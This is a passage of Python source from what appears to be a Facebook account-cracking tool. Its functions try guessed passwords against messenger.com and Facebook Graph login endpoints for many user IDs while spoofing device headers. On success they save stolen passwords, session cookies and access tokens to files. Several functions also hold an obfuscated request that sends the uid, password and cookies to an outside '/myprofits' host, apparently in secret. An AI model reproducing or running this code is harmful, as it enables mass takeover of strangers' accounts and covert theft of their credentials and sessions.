    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': mas.iPhone_user_agent(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def host_messanger_windows(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': mas.windows_user_agent(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        




def mac_chrome_ua():
    mac_version = str(random.randint(11, 15))  # macOS major version
    chrome_major = random.randint(120, 140)    # Chrome major version
    chrome_build = random.randint(6000, 7000)  # Build number
    chrome_patch = random.randint(50, 150)     # Patch number
    
    return (f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_version}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36")
            




def host_messanger_MAC(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': mac_chrome_ua(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        


def file_messanger(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie': f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': Linux_ua(),}
        for pw in pwx:
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            rq=session.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        








def b_graph_renmeth(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': ua,
            'Host':'b-graph.facebook.com',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000,40000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url="https://b-graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            if rq['is_account_confirmed'] == False:
                                open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            else:
                                open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                                open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token=rq['access_token']
                            open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            elif "user must verify" in str(rq).lower():
                xd=str(rq['error']['error_data']['uid'])
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)




def graph_renmeth(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': ua,
            'Host':'graph.facebook.com',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000,40000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url="https://graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            if rq['is_account_confirmed'] == False:
                                open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            else:
                                open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                                open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token=rq['access_token']
                            open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            elif "user must verify" in str(rq).lower():
                xd=str(rq['error']['error_data']['uid'])
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)





def renmeth6(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            edata={
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "11994080425506443985518532446",
                "variables": "{\"params\": " + json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": str(uuid.uuid4()),
                            "attestation_result": {
                                "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                                "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                                "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                            },
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "sim_serials": [],
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "null",
                            "should_show_nested_nta_from_aymh": 0,
                            "device_id": str(uuid.uuid4()),
                            "login_attempt_count": 1,
                            "machine_id": "",
                            "flash_call_permission_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"},
                            "accounts_list": [],
                            "family_device_id": str(uuid.uuid4()),
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": str(uuid.uuid4()),
                            "openid_tokens": {},
                            "contact_point": uid},
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "pw_encryption_try_count": 1,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "is_from_landing_page": 0,
                            "password_text_input_id": "2l8w01:99",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "2l8w01:98",
                            "layered_homepage_experiment_group": 'null',
                            "device_id": str(uuid.uuid4()),
                            "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": str(uuid.uuid4()),
                            "is_from_assistive_id": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                }) + "}",
                "fb_api_analytics_tags": "[\"GraphServices\"]",
                "client_trace_id": str(uuid.uuid4()),}
            head={
                "user-agent": ua,
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "host": "b-graph.facebook.com",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(20000,40000)),
                "x-fb-net-hni": str(random.randint(20000,40000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(2000,4000)),
                "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
                "x-zero-state": "unknown",
                "x-fb-connection-type": "WIFI",
                "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
                "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "Content-Length": "1966"}
            url='https://b-graph.facebook.com/graphql'
            rq=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in rq:
                data_coki=rq.replace(symbolsx,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+";xs="+xs+";fr="+fr+";datr="+datr
                xd=c_user
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        


def renmeth78(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            edata={
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "11994080425506443985518532446",
                "variables": "{\"params\": " + json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": str(uuid.uuid4()),
                            "attestation_result": {
                                "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                                "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                                "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                            },
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "sim_serials": [],
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "null",
                            "should_show_nested_nta_from_aymh": 0,
                            "device_id": str(uuid.uuid4()),
                            "login_attempt_count": 1,
                            "machine_id": "",
                            "flash_call_permission_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"},
                            "accounts_list": [],
                            "family_device_id": str(uuid.uuid4()),
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": str(uuid.uuid4()),
                            "openid_tokens": {},
                            "contact_point": uid},
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "pw_encryption_try_count": 1,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "is_from_landing_page": 0,
                            "password_text_input_id": "2l8w01:99",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "2l8w01:98",
                            "layered_homepage_experiment_group": 'null',
                            "device_id": str(uuid.uuid4()),
                            "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": str(uuid.uuid4()),
                            "is_from_assistive_id": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                }) + "}",
                "fb_api_analytics_tags": "[\"GraphServices\"]",
                "client_trace_id": str(uuid.uuid4()),}
            head={
                "user-agent": ua,
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "host": "graph.facebook.com",
